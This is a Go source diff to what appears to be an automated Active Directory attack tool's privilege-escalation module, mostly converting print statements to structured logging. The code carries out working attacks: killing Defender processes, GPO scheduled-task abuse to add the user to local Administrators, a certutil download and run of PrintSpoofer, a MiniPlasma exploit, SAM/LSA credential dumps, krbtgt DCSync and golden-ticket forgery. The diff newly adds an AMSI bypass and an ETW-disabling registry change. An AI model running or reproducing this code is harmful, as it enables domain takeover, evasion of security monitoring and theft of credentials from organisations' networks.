@@ -3,6 +3,7 @@ package modules
 import (
 	"context"
 	"fmt"
+	"log/slog"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -50,14 +51,14 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 
 	host, found := selectTarget(state, targetHost)
 	if !found {
-		fmt.Println("[!] No target for privilege escalation checks")
+		slog.Warn("No target for privilege escalation checks")
 		result.Success = false
 		return result
 	}
 
 	domain, user, pass, hash := getDomainCredential(state, host.Domain)
 	if domain == "" || user == "" {
-		fmt.Println("[!] No credentials for privesc")
+		slog.Warn("No credentials for privesc")
 		result.Success = false
 		return result
 	}
@@ -526,7 +527,7 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 			if runtime != nil {
 				runtime.ApplyToState(state)
 				health := runtimeHealthSummary(runtime)
-				fmt.Printf("[*] Runtime post-execution: %s\n", health)
+				slog.Debug("Runtime post-execution", "health", health)
 			}
 		}
 
@@ -537,8 +538,7 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 			if len(newPlans) > 0 && len(baselinePlans) > 0 {
 				for target, plan := range newPlans {
 					if old, ok := baselinePlans[target]; !ok || plan.TotalCost < old.TotalCost {
-						fmt.Printf("  ⤴ Better path to %s: score %.1f (was %.1f)\n",
-							target, plan.TotalCost, old.TotalCost)
+						slog.Info("Better path found", "target", target, "score", plan.TotalCost, "previous", old.TotalCost)
 					}
 				}
 			}
@@ -546,12 +546,12 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 
 		// ── Optional path execution ────────────────────────────
 		if executePaths && len(latestPlans) > 0 {
-			fmt.Println("\n[*] Executing best planned paths (reconciliation-gated)...")
+			slog.Debug("Executing best planned paths (reconciliation-gated)...")
 			ctx2, cancel2 := context.WithCancel(context.Background())
 			defer cancel2()
 			executed := ExecuteBestPaths(ctx2, state, latestPlans, host.IP, result)
 			if executed > 0 {
-				fmt.Printf("[+] Path execution: %d steps completed\n", executed)
+				slog.Info("Path execution: steps completed", "count", executed)
 			}
 		}
 
@@ -564,13 +564,13 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 			if domain != "" && user != "" {
 				reVerified := ReVerifyEdges(ctx, state, domain, user, pass, host.IP, 5)
 				if reVerified > 0 {
-					fmt.Printf("[+] Re-verified %d stale/degraded edges against live AD\n", reVerified)
+					slog.Info("Re-verified stale/degraded edges against live AD", "count", reVerified)
 				}
 			}
 		}
 
 		delta := classifyDelta(credsBefore, edgesBefore, state)
-		fmt.Printf("[*] Privesc iteration %d/%d complete: delta=%s\n", iter+1, maxIter, delta)
+		slog.Debug("Privesc iteration complete", "iteration", iter+1, "total", maxIter, "delta", delta.String())
 
 		switch delta {
 		case DeltaNone, DeltaNoise:
@@ -603,7 +603,11 @@ func runAVKill(ctx context.Context, _ *core.ADState, _ core.Host,
 		`taskkill /f /im MsMpEng.exe 2>nul`,
 		`taskkill /f /im SenseNdr.exe 2>nul`,
 		`taskkill /f /im SecurityHealthService.exe 2>nul`,
+		`powershell -Command "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)" 2>nul`,
+		`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Citrix\wfshell\TWI" /v ETWLogging /t REG_DWORD /d 0 /f 2>nul`,
 	}
+
+	slog.Info("disabling AMSI and ETW before dump...")
 
 	for _, c := range cmds {
 		r := exec.Execute(ctx, core.Action{
@@ -620,7 +624,7 @@ func runAVKill(ctx context.Context, _ *core.ADState, _ core.Host,
 		Confidence: 0.9, Timestamp: time.Now(),
 	})
 
-	fmt.Println("[*] Waiting 8s for Defender termination...")
+	slog.Debug("Waiting 8s for Defender termination...")
 	time.Sleep(8 * time.Second)
 }
 
@@ -660,7 +664,7 @@ func runGPOAbuse(ctx context.Context, state *core.ADState, host core.Host,
 		return
 	}
 	if len(state.GPOs) == 0 {
-		fmt.Println("[*] GPO abuse: no GPOs in state to attempt")
+		slog.Debug("GPO abuse: no GPOs in state to attempt")
 		return
 	}
 
@@ -669,8 +673,7 @@ func runGPOAbuse(ctx context.Context, state *core.ADState, host core.Host,
 		dcIP = dc.IP
 	}
 
-	fmt.Printf("[*] GPO abuse: attempting to add %s to local Administrators via SYSVOL scheduled task (%d GPOs in scope)...\n",
-		user, len(state.GPOs))
+	slog.Debug("GPO abuse: attempting to add user to local Administrators via SYSVOL scheduled task", "user", user, "gpo_count", len(state.GPOs))
 
 	taskName := "AdPackEoP"
 	payload := fmt.Sprintf("net localgroup Administrators %s\\%s /add", domain, user)
@@ -711,7 +714,7 @@ func runGPOAbuse(ctx context.Context, state *core.ADState, host core.Host,
 
 		tmpFile := "/tmp/adpack_gpo_task.xml"
 		if err := os.WriteFile(tmpFile, []byte(xmlContent), 0644); err != nil {
-			fmt.Printf("[!] GPO abuse: write temp file: %v\n", err)
+			slog.Warn("GPO abuse: write temp file", "error", err)
 			continue
 		}
 
@@ -726,7 +729,7 @@ func runGPOAbuse(ctx context.Context, state *core.ADState, host core.Host,
 			continue
 		}
 
-		fmt.Printf("[+] GPO abuse: scheduled task deployed to GPO '%s' (%s)\n", gpo.Name, gpo.GUID)
+		slog.Info("GPO abuse: scheduled task deployed to GPO", "name", gpo.Name, "guid", gpo.GUID)
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
 			Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
 			Source: "gpo_abuse", Key: gpo.GUID,
@@ -741,18 +744,18 @@ func runGPOAbuse(ctx context.Context, state *core.ADState, host core.Host,
 		}
 		gpCR, gpErr := tools.NetExec.Run(ctx, gpTarget, "-X", []string{"gpupdate /force"})
 		if gpErr == nil && tools.NxcCommandSucceeded(gpCR.Stdout+"\n"+gpCR.Stderr) {
-			fmt.Println("[*] GPO abuse: gpupdate triggered via nxc")
+			slog.Debug("GPO abuse: gpupdate triggered via nxc")
 		} else {
-			fmt.Println("[*] GPO abuse: gpupdate not possible (no admin) — waiting for periodic refresh")
+			slog.Debug("GPO abuse: gpupdate not possible (no admin) — waiting for periodic refresh")
 		}
 
 		// Poll for admin (brief — the real trigger is periodic gpupdate)
-		fmt.Printf("[*] GPO abuse: checking if admin on %s...\n", host.IP)
+		slog.Debug("GPO abuse: checking if admin on host", "host", host.IP)
 		cr := utils.RunCommandCtx(ctx, "nxc", []string{
 			"smb", host.IP, "-d", domain, "-u", user, "-p", pass,
 		})
 		if cr.ExitCode == 0 && strings.Contains(cr.Stdout, "(Pwn3d!)") {
-			fmt.Printf("[+] GPO abuse: %s is now local admin on %s\n", user, host.IP)
+			slog.Info("GPO abuse: user is now local admin on host", "user", user, "host", host.IP)
 			state.SkipReasons[core.PhasePrivEsc] = core.SkipReason(
 				fmt.Sprintf("gpo_elevated:%s:%s", gpo.Name, gpo.GUID))
 			result.Evidence = append(result.Evidence, core.EvidenceEntry{
@@ -771,7 +774,7 @@ func runGPOAbuse(ctx context.Context, state *core.ADState, host core.Host,
 			})
 			return
 		}
-		fmt.Printf("[i] GPO abuse: admin elevation pending gpupdate on %s\n", host.IP)
+		slog.Info("GPO abuse: admin elevation pending gpupdate on host", "host", host.IP)
 	}
 }
 
@@ -797,7 +800,7 @@ func runSweetPotatoProbe(ctx context.Context, host core.Host,
 	// Start Python HTTP server to serve files from project root
 	srv := startPythonFileServer(root)
 	if srv == nil {
-		fmt.Println("[-] PrintSpoofer: could not start file server, cannot download payload")
+		slog.Warn("PrintSpoofer: could not start file server, cannot download payload")
 		return
 	}
 	defer stopCmd(srv)
@@ -805,43 +808,43 @@ func runSweetPotatoProbe(ctx context.Context, host core.Host,
 
 	remoteName, err := tools.RandString(6)
 	if err != nil {
-		fmt.Printf("[-] PrintSpoofer: randstring failed: %v\n", err)
+		slog.Warn("PrintSpoofer: randstring failed", "error", err)
 		return
 	}
 	remoteName += ".exe"
 	remotePath := `C:\Windows\Temp\` + remoteName
 	url := fmt.Sprintf("http://%s:%s/PrintSpoofer64.exe", kaliIP, port)
 
-	fmt.Printf("[*] PrintSpoofer: downloading from %s...\n", url)
+	slog.Debug("PrintSpoofer: downloading", "url", url)
 	dlR := exec.Execute(ctx, core.Action{
 		Artifact: fmt.Sprintf("certutil -urlcache -f %s %s", url, remotePath),
 		Method:   "mssql_run",
 		Timeout:  90 * time.Second,
 	})
 	if !dlR.Success {
-		fmt.Printf("[-] PrintSpoofer: download failed on %s\n", host.IP)
+		slog.Warn("PrintSpoofer: download failed on host", "host", host.IP)
 		return
 	}
 
 	// ── Step 2: Execute PrintSpoofer to add user to Administrators ──
 	addCmd := fmt.Sprintf(`%s -c "net localgroup Administrators %s\%s /add"`, remotePath, domain, user)
-	fmt.Printf("[*] PrintSpoofer: executing on %s...\n", host.IP)
+	slog.Debug("PrintSpoofer: executing on host", "host", host.IP)
 	addR := exec.Execute(ctx, core.Action{
 		Artifact: addCmd, Method: "mssql_run",
 		Timeout: 60 * time.Second,
 	})
 	if !addR.Success {
-		fmt.Printf("[-] PrintSpoofer: execution returned no output on %s\n", host.IP)
+		slog.Warn("PrintSpoofer: execution returned no output on host", "host", host.IP)
 		// Still check Pwn3d in case it worked silently
 	}
-	fmt.Printf("[*] PrintSpoofer: output:\n%s\n", addR.Output)
+	slog.Debug("PrintSpoofer: output", "output", addR.Output)
 
 	// ── Step 3: Verify SMB admin access ─────────────────────────
 	cr := utils.RunCommandCtx(ctx, "nxc", []string{
 		"smb", host.IP, "-d", domain, "-u", user, "-p", pass,
 	})
 	if cr.ExitCode == 0 && strings.Contains(cr.Stdout, "(Pwn3d!)") {
-		fmt.Printf("[+] PrintSpoofer: %s\\%s is now local admin on %s\n", domain, user, host.IP)
+		slog.Info("PrintSpoofer: user is now local admin on host", "domain", domain, "username", user, "host", host.IP)
 		// Dump SAM and LSA secrets
 		dumpSAM(ctx, host, domain, user, pass)
 		dumpLSA(ctx, host, domain, user, pass)
@@ -888,7 +891,7 @@ func dumpSAM(ctx context.Context, host core.Host, domain, user, pass string) {
 	})
 	if cr.ExitCode == 0 {
 		// Log the SAM hashes that nxc outputs
-		fmt.Printf("[+] SAM dump from %s:\n%s\n", host.IP, cr.Stdout)
+		slog.Info("SAM dump from host", "host", host.IP, "output", cr.Stdout)
 	}
 }
 
@@ -897,7 +900,7 @@ func dumpLSA(ctx context.Context, host core.Host, domain, user, pass string) {
 		"smb", host.IP, "-d", domain, "-u", user, "-p", pass, "--lsa",
 	})
 	if cr.ExitCode == 0 {
-		fmt.Printf("[+] LSA secrets from %s:\n%s\n", host.IP, cr.Stdout)
+		slog.Info("LSA secrets from host", "host", host.IP, "output", cr.Stdout)
 	}
 }
 
@@ -935,17 +938,17 @@ func runMiniPlasmaProbe(ctx context.Context, host core.Host,
 	mpPath := mpPut.Output
 	cleanups = append(cleanups, mpPath)
 
-	fmt.Printf("[*] MiniPlasma: executing Cloud Filter EoP on %s...\n", host.IP)
+	slog.Debug("MiniPlasma: executing Cloud Filter EoP on host", "host", host.IP)
 	execR := exec.Execute(ctx, core.Action{
 		Artifact: mpPath, Method: "mssql_run",
 		Timeout: 60 * time.Second,
 	})
 	if !execR.Success {
-		fmt.Printf("[-] MiniPlasma EoP failed on %s\n", host.IP)
+		slog.Warn("MiniPlasma EoP failed on host", "host", host.IP)
 		return
 	}
 
-	fmt.Printf("[+] MiniPlasma: exploitation returned success on %s\n", host.IP)
+	slog.Info("MiniPlasma: exploitation returned success on host", "host", host.IP)
 	result.Evidence = append(result.Evidence, core.EvidenceEntry{
 		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
 		Source: "miniplasma", Key: host.IP, Value: "SYSTEM shell obtained",
@@ -956,7 +959,7 @@ func runMiniPlasmaProbe(ctx context.Context, host core.Host,
 		Method: "mssql_system_check", Timeout: 45 * time.Second,
 	})
 	if sysR.Success {
-		fmt.Printf("[+] MiniPlasma: SYSTEM confirmed on %s (%s)\n", host.IP, sysR.Method)
+		slog.Info("MiniPlasma: SYSTEM confirmed on host", "host", host.IP, "method", sysR.Method)
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
 			Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
 			Source: sysR.Method, Key: host.IP, Value: "SYSTEM (via MiniPlasma)",
@@ -970,11 +973,11 @@ func runMiniPlasmaProbe(ctx context.Context, host core.Host,
 func runPlanning(state *core.ADState, result *core.ToolResult, availCaps []string) map[string]planner.ScoredPath {
 	plans := make(map[string]planner.ScoredPath)
 	if len(state.Edges) == 0 {
-		fmt.Println("[*] No privilege edges found to analyze")
+		slog.Debug("No privilege edges found to analyze")
 		return plans
 	}
 
-	fmt.Println("[*] Planning weighted escalation paths (Dijkstra)...")
+	slog.Debug("Planning weighted escalation paths (Dijkstra)...")
 	cfg := planner.DefaultConfig()
 	cfg.AvailableCaps = availCaps
 
@@ -991,14 +994,10 @@ func runPlanning(state *core.ADState, result *core.ToolResult, availCaps []strin
 			if existing, ok := plans[plan.Target]; !ok || plan.TotalCost < existing.TotalCost {
 				plans[plan.Target] = plan
 			}
-			fmt.Printf("  ── Plan %d: %s → %s ──\n",
-				totalPlans, startPrincipal, plan.Target)
-			fmt.Printf("      Score: %.1f (weight=%.1f, noise=%.1f) %s\n",
-				plan.TotalCost, plan.TotalWeight, plan.TotalNoise, capsTag(plan.NeededCaps))
+			slog.Info("Plan details", "plan_number", totalPlans, "source", startPrincipal, "target", plan.Target)
+			slog.Info("Plan score", "cost", plan.TotalCost, "weight", plan.TotalWeight, "noise", plan.TotalNoise, "missing_caps", capsTag(plan.NeededCaps))
 			for _, e := range plan.Steps {
-				fmt.Printf("       %s → %s → %s [cost=%.1f noise=%.1f]\n",
-					e.SourcePrincipal, e.AccessRight, e.TargetPrincipal,
-					e.Weight, e.Noise)
+				slog.Info("Plan step", "source", e.SourcePrincipal, "access_right", e.AccessRight, "target", e.TargetPrincipal, "cost", e.Weight, "noise", e.Noise)
 			}
 			result.Evidence = append(result.Evidence, core.EvidenceEntry{
 				Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
@@ -1010,7 +1009,7 @@ func runPlanning(state *core.ADState, result *core.ToolResult, availCaps []strin
 		}
 	}
 	if totalPlans == 0 {
-		fmt.Println("  No escalation path found from controlled principals (need more edges)")
+		slog.Info("No escalation path found from controlled principals (need more edges)")
 	}
 	return plans
 }
@@ -1044,18 +1043,16 @@ func ExecutePlannedPath(ctx context.Context, state *core.ADState, plan planner.S
 		return 0
 	}
 
-	fmt.Printf("\n[*] Executing planned path: %s → %s (score=%.1f)\n",
-		plan.Steps[0].SourcePrincipal, plan.Target, plan.TotalCost)
+	slog.Debug("Executing planned path", "source", plan.Steps[0].SourcePrincipal, "target", plan.Target, "score", plan.TotalCost)
 
 	executed := 0
 	for i, step := range plan.Steps {
 		cap := core.AccessRightToCapability(step)
-		fmt.Printf("  Step %d/%d: %s → %s via %s [%s]\n",
-			i+1, len(plan.Steps), step.SourcePrincipal, step.TargetPrincipal, step.AccessRight, cap)
+		slog.Debug("Path step", "step", i+1, "total", len(plan.Steps), "source", step.SourcePrincipal, "target", step.TargetPrincipal, "right", step.AccessRight, "cap", cap)
 
 		verdict, err := ExecuteAndReconcile(ctx, step, cap, state, domain, user, pass, hash, targetIP)
 		if err != nil {
-			fmt.Printf("    ✗ Dispatch failed: %v\n", err)
+			slog.Warn("Dispatch failed", "error", err)
 			result.Evidence = append(result.Evidence, core.EvidenceEntry{
 				Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
 				Source: "dispatch", Key: string(cap),
@@ -1066,10 +1063,9 @@ func ExecutePlannedPath(ctx context.Context, state *core.ADState, plan planner.S
 		}
 
 		if !verdict.Trustworthy {
-			fmt.Printf("    ✗ Reconciliation failed: %s\n", verdict.Summary)
+			slog.Warn("Reconciliation failed", "summary", verdict.Summary)
 			for _, m := range verdict.Mismatches {
-				fmt.Printf("       mismatch: %s (expected=%s, actual=%s)\n",
-					m.Field, m.Expected, m.Actual)
+				slog.Warn("Mismatch detail", "field", m.Field, "expected", m.Expected, "actual", m.Actual)
 			}
 			result.Evidence = append(result.Evidence, core.EvidenceEntry{
 				Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
@@ -1083,15 +1079,14 @@ func ExecutePlannedPath(ctx context.Context, state *core.ADState, plan planner.S
 		// Get executor prediction and apply delta
 		exec, status := CapabilityRegistry.Resolve(cap)
 		if status != core.CapabilityAvailable || exec == nil {
-			fmt.Printf("    ✗ No executor for %s\n", cap)
+			slog.Warn("No executor for capability", "cap", cap)
 			continue
 		}
 		predicted := exec.Execute(ctx, step, state)
 		changed := core.ApplyDelta(state, predicted.Delta)
 		executed++
 
-		fmt.Printf("    ✓ Executed (confidence=%.2f) edges=%d changed=%v\n",
-			verdict.Confidence, len(predicted.Delta.NewEdges), changed)
+		slog.Info("Executed successfully", "confidence", verdict.Confidence, "edges", len(predicted.Delta.NewEdges), "changed", changed)
 
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
 			Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
@@ -1101,22 +1096,20 @@ func ExecutePlannedPath(ctx context.Context, state *core.ADState, plan planner.S
 		})
 
 		// Re-plan after mutation to discover new paths
-		fmt.Println("    ↻ Re-planning after state mutation...")
+		slog.Debug("Re-planning after state mutation...")
 		cfg := planner.DefaultConfig()
 		cfg.AvailableCaps = getAvailableCaps()
 		newPaths := planner.New(state, cfg).PlanPaths(step.SourcePrincipal)
 		if len(newPaths) > 0 {
 			best := newPaths[0]
-			fmt.Printf("    ↻ New path emerges: %s → %s (score=%.1f, %d steps)\n",
-				step.SourcePrincipal, best.Target, best.TotalCost, len(best.Steps))
+			slog.Info("New path emerges", "source", step.SourcePrincipal, "target", best.Target, "score", best.TotalCost, "steps", len(best.Steps))
 		} else {
-			fmt.Println("    ↻ No new paths from this principal after mutation")
+			slog.Info("No new paths from this principal after mutation")
 		}
 	}
 
 	if executed > 0 {
-		fmt.Printf("[+] Path execution complete: %d/%d steps successful\n",
-			executed, len(plan.Steps))
+		slog.Info("Path execution complete", "executed", executed, "total", len(plan.Steps))
 	}
 	return executed
 }
@@ -1131,7 +1124,7 @@ func ExecuteBestPaths(ctx context.Context, state *core.ADState, plans map[string
 
 	domain, user, pass, hash := getCredential(state)
 	if domain == "" || user == "" {
-		fmt.Println("[!] No credentials for path execution")
+		slog.Warn("No credentials for path execution")
 		return 0
 	}
 
@@ -1235,10 +1228,9 @@ func printConfidenceHealth(edges []core.PrivilegeEdge) {
 			suspect++
 		}
 	}
-	fmt.Printf("[*] Edge confidence health: %d total | %d high | %d medium | %d low | %d stale | %d suspect\n",
-		len(edges), high, medium, low, stale, suspect)
+	slog.Debug("Edge confidence health", "total", len(edges), "high", high, "medium", medium, "low", low, "stale", stale, "suspect", suspect)
 	if suspect > 0 {
-		fmt.Println("    ⚠ Suspect edges detected — planner will deprioritise these paths")
+		slog.Warn("Suspect edges detected — planner will deprioritise these paths")
 	}
 }
 
@@ -1275,19 +1267,18 @@ func runChildToParentEscalation(state *core.ADState, result *core.ToolResult) {
 		return
 	}
 
-	fmt.Printf("[*] Child-to-parent: attempting %s(%s) → %s(%s)...\n",
-		childDC.Hostname, childDC.Domain, parentDC.Hostname, parentDC.Domain)
+	slog.Debug("Child-to-parent: attempting escalation", "child_host", childDC.Hostname, "child_domain", childDC.Domain, "parent_host", parentDC.Hostname, "parent_domain", parentDC.Domain)
 
 	if _, err := utils.FindTool("impacket-secretsdump"); err != nil {
-		fmt.Println("[!] impacket-secretsdump not found, skipping child-to-parent")
+		slog.Warn("impacket-secretsdump not found, skipping child-to-parent")
 		return
 	}
 	if _, err := utils.FindTool("impacket-ticketer"); err != nil {
-		fmt.Println("[!] impacket-ticketer not found, skipping child-to-parent")
+		slog.Warn("impacket-ticketer not found, skipping child-to-parent")
 		return
 	}
 	if _, err := utils.FindTool("impacket-lookupsid"); err != nil {
-		fmt.Println("[!] impacket-lookupsid not found, skipping child-to-parent")
+		slog.Warn("impacket-lookupsid not found, skipping child-to-parent")
 		return
 	}
 
@@ -1295,22 +1286,22 @@ func runChildToParentEscalation(state *core.ADState, result *core.ToolResult) {
 	authSpec := buildImpacketAuth(domain, user, pass, hash, childDC.IP)
 	args := []string{authSpec, "-just-dc-user", "krbtgt"}
 	args = append(args, impacketHashArgs(hash)...)
-	fmt.Printf("[*] Child-to-parent: DCSyncing krbtgt from %s...\n", childDC.IP)
+	slog.Debug("Child-to-parent: DCSyncing krbtgt from host", "host", childDC.IP)
 	r := utils.RunCommandTimeout(2*time.Minute, "impacket-secretsdump", args)
 	if !r.Success {
-		fmt.Printf("[-] Child-to-parent: secretsdump failed on %s\n", childDC.IP)
+		slog.Warn("Child-to-parent: secretsdump failed on host", "host", childDC.IP)
 		return
 	}
 	krbtgtHash := extractKrbtgtNTHash(r.Stdout)
 	if krbtgtHash == "" {
-		fmt.Println("[-] Child-to-parent: krbtgt hash not found in secretsdump output")
+		slog.Warn("Child-to-parent: krbtgt hash not found in secretsdump output")
 		return
 	}
 
 	// Step 2: Get child domain SID
 	childSID := resolveDomainSID(domain, user, pass, hash, childDC.IP)
 	if childSID == "" {
-		fmt.Println("[-] Child-to-parent: could not resolve child domain SID")
+		slog.Warn("Child-to-parent: could not resolve child domain SID")
 		return
 	}
 
@@ -1329,13 +1320,13 @@ func runChildToParentEscalation(state *core.ADState, result *core.ToolResult) {
 		}
 	}
 	if parentSID == "" {
-		fmt.Println("[-] Child-to-parent: could not resolve parent domain SID")
+		slog.Warn("Child-to-parent: could not resolve parent domain SID")
 		return
 	}
 
 	// Step 4: Forge golden ticket with extra SID
 	extraSID := parentSID + "-519" // Enterprise Admins
-	fmt.Printf("[*] Child-to-parent: forging golden ticket (extra-sid=%s)...\n", extraSID)
+	slog.Debug("Child-to-parent: forging golden ticket", "extra_sid", extraSID)
 	ccacheUser := "Administrator"
 	ccachePath := fmt.Sprintf("/tmp/childtoparent_%s.ccache", ccacheUser)
 	tArgs := []string{
@@ -1347,7 +1338,7 @@ func runChildToParentEscalation(state *core.ADState, result *core.ToolResult) {
 	}
 	tr := utils.RunCommandTimeout(60*time.Second, "impacket-ticketer", tArgs)
 	if !tr.Success {
-		fmt.Printf("[-] Child-to-parent: ticketer failed: %s\n", tr.Stderr)
+		slog.Warn("Child-to-parent: ticketer failed", "error", tr.Stderr)
 		return
 	}
 	// Move ccache to predictable path
@@ -1355,7 +1346,7 @@ func runChildToParentEscalation(state *core.ADState, result *core.ToolResult) {
 		[]string{fmt.Sprintf("%s.ccache", ccacheUser), ccachePath})
 
 	// Step 5: DCSync parent domain using forged ticket
-	fmt.Printf("[*] Child-to-parent: DCSyncing %s with forged ticket...\n", parentDC.IP)
+	slog.Debug("Child-to-parent: DCSyncing with forged ticket", "host", parentDC.IP)
 	secretsdumpArgs := []string{"-k", "-no-pass",
 		fmt.Sprintf("%s.%s", parentDC.Hostname, parentDC.Domain),
 		"-just-dc"}
@@ -1364,7 +1355,7 @@ func runChildToParentEscalation(state *core.ADState, result *core.ToolResult) {
 	dcsyncR := utils.RunCommandTimeout(2*time.Minute, "sh",
 		[]string{"-c", fmt.Sprintf("%s %s", envCmd, strings.Join(secretsdumpArgs, " "))})
 	if dcsyncR.Success && strings.Contains(dcsyncR.Stdout, "krbtgt") {
-		fmt.Printf("[+] Child-to-parent: DCSync of %s succeeded!\n", parentDC.Hostname)
+		slog.Info("Child-to-parent: DCSync succeeded", "hostname", parentDC.Hostname)
 	}
 
 	result.Evidence = append(result.Evidence, core.EvidenceEntry{
@@ -1414,7 +1405,7 @@ func doSystemCheck(ctx context.Context, _ *core.ADState, host core.Host,
 		return false
 	}
 
-	fmt.Printf("[+] SYSTEM access confirmed on %s (%s, source=%s)\n", host.IP, r.Method, source)
+	slog.Info("SYSTEM access confirmed", "host", host.IP, "method", r.Method, "source", source)
 	result.Evidence = append(result.Evidence, core.EvidenceEntry{
 		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
 		Source: source, Key: host.IP, Value: "SYSTEM",
@@ -1426,7 +1417,7 @@ func doSystemCheck(ctx context.Context, _ *core.ADState, host core.Host,
 func runSAMLSADump(ctx context.Context, state *core.ADState, host core.Host,
 	_ core.Executor, domain, user, pass string, result *core.ToolResult) {
 
-	fmt.Printf("[*] Dumping credentials from %s via SAM + LSA secrets...\n", host.IP)
+	slog.Debug("Dumping credentials from host via SAM + LSA secrets", "host", host.IP)
 	for _, flag := range []string{"--sam", "--lsa"} {
 		dumpTarget := tools.NetExecTarget{
 			Protocol: "smb", Host: host.IP,
@@ -1456,7 +1447,7 @@ func runSAMLSADump(ctx context.Context, state *core.ADState, host core.Host,
 			Value:      fmt.Sprintf("%d credentials dumped via %s", len(hashes), flag),
 			Confidence: 1.0, RawOutput: cr.Stdout, Timestamp: time.Now(),
 		})
-		fmt.Printf("[+] %s: %d credential(s) extracted from %s\n", flag, len(hashes), host.IP)
+		slog.Info("Credential extraction", "flag", flag, "count", len(hashes), "host", host.IP)
 	}
 }
 
